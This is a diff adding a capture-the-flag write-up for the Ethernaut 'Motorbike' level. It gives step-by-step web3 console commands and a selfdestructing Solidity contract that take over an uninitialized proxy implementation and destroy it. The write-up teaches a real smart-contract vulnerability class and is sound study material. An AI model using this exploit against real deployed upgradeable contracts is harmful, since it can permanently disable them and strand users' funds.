@@ -980,3 +980,74 @@ await getBalance(contract.address)
 ```
 await contract.setMaxBalance(player)
 ```
+
+
+
+# 25. [Challenge 25: Motorbike](https://ethernaut.openzeppelin.com/level/0x78e23A3881e385465F19c1a03E2F9fFEBdAD6045)
+
+Tasks:
+- Ethernaut's motorbike has a brand new upgradeable engine design. Would you be able to selfdestruct its engine and make the motorbike unusable ?
+
+**Solution:** \
+To Solve in console:
+
+1. upgradeToAndCall method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the upgrader address can call it. So, player has to somehow take over as upgrader. The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. Engine is actually stored in the proxy's (Motorbike's) storage and not actually Engine. Proxy is the storage layer here which delegates only the logic to logic/implementation contract (logic layer). What if we did try to write and read in the context of Engine directly, instead of going through proxy? We'll need address of Engine first. This address is at storage slot _IMPLEMENTATION_SLOT of Motorbike. Let's read it:
+```
+implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+implAddr = '0x' + implAddr.slice(-40)
+```
+2. Now, if we sent a transaction directly to initialize of Engine rather than going through proxy, the code will run in Engine's context rather than proxy's. That means the storage variables - initialized, initializing (inherited from Initializable), upgrader etc. will be read from Engine's storage slots. And these variables will most likely will contain their default values - false, false, 0x0 respectively because Engine was supposed to be only the logic layer, not storage. And since initialized will be equal to false (default for bool) in context of Engine the initializer modifier on initialize method will pass! Call the initialize at Engine's address i.e. at implAddr:
+```
+initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
+
+await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
+```
+3. Alright, invoking initialize method must've now set player as upgrader. Verify by:
+```
+upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
+
+await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()
+
+// Output: true
+
+```
+4. So, player is now eligible to upgrade the implementation contract now through upgradeToAndCall method. Let's create the following malicious contract - BombEngine in Remix:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity <0.7.0;
+
+contract BombEngine {
+    function explode() public {
+        selfdestruct(address(0));
+    }
+}
+```
+5. Deploy BombEngine (on same network) and copy it's address. If we set the new implementation through upgradeToAndCall, passing BombEngine address and encoding of it's explode method as params, the existing Engine would destroy itself. This is because _upgradeToAndCall delegates a call to the given new implementation address with provided data param. And since delegatecall is context preserving, the selfdestruct of explode method would run in context of Engine. Thus Engine is destroyed. Upgrade Engine to BombEngine. First set up function data of upgradeToAndCall to call at implAddress:
+```
+bombAddr = '<BombEngine-instance-address>'
+explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
+
+upgradeSignature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes',
+            name: 'data'
+        }
+    ]
+}
+
+upgradeParams = [bombAddr, explodeData]
+
+upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
+```
+6. Now call upgradeToAndCall at implAddr:
+```
+await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
+```
+Boom! The Engine is destroyed! The Motorbike is now useless. Motorbike cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.
